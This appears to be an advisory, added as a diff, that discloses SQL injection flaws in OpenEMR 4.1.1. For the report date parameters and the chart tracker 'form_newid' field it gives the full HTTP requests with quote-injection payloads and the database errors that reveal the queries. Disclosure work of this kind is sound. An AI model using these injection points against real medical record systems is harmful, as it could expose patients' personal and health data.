@@ -1,0 +1,50 @@
+1. Reports > Visits > SuperBill > Dates ('start' and 'end' parameters are vulnerable with a POST to
+/openemr-4.1.1/interface/reports/custom_report_range.php)
+
+#Request
+
+POST http://www.example.com/openemr-4.1.1/interface/reports/custom_report_range.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/openemr-4.1.1/interface/reports/custom_report_range.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+form_refresh=true&start=2013-01-07&end=2013-02-06'INJECT
+
+#Response
+
+<snip>
+<p><p><font color='red'>ERROR:</font> query failed: select * from forms where form_name = 'New Patient Encounter' and 
+date between '2013-01-07' and '2013-02'-06' order by date DESC<p>Error: <font color='red'>You have an error in your SQL 
+syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by 
+date DESC' at line 1</font><p> <snip>
+
+2. Misc > Chart Tracker ('form_newid' parameter is vulnerable with a POST to /openemr-4.1.1/custom/chart_tracker.php)
+
+
+#Request
+
+POST http://www.example.com/openemr-4.1.1/custom/chart_tracker.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/openemr-4.1.1/custom/chart_tracker.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+form_newid=test'INJECT&form_lookup=Look+Up
+
+#Response
+
+<snip>
+<p><p><font color='red'>ERROR:</font> query failed: SELECT pd.pid, pd.pubpid, pd.fname, pd.mname, pd.lname, pd.ss, 
+pd.DOB, ct.ct_userid, ct.ct_location, ct.ct_when FROM patient_data AS pd LEFT OUTER JOIN chart_tracker AS ct ON 
+ct.ct_pid = pd.pid WHERE pd.pubpid = 'test'INJECT' ORDER BY pd.pid ASC, ct.ct_when DESC LIMIT 1<p> <snip>
+
+
